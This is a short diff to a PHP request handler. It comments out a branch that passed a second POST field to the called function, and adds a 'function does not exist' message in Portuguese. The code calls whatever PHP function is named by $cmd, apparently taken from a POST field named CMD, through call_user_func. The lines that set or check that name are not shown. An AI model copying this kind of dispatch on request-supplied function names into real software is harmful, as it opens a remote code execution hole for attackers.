@@ -38,11 +38,13 @@ if (isset($_POST["CMD"])) {
     }
     try {
         if (function_exists($cmd)) {
-            if (isset($_POST["MUSTACHE"])) {
-                call_user_func($cmd, $tmp2, $_POST["MUSTACHE"]);
-            } else {
+//            if (isset($_POST["MUSTACHE"])) {
+//                call_user_func($cmd, $tmp2, $_POST["MUSTACHE"]);
+//            } else {
                 call_user_func($cmd, $tmp2);
-            }
+//            }
+        }else{
+            console("Função não existe");
         }
     } catch (Throwable $t) {
         ?>
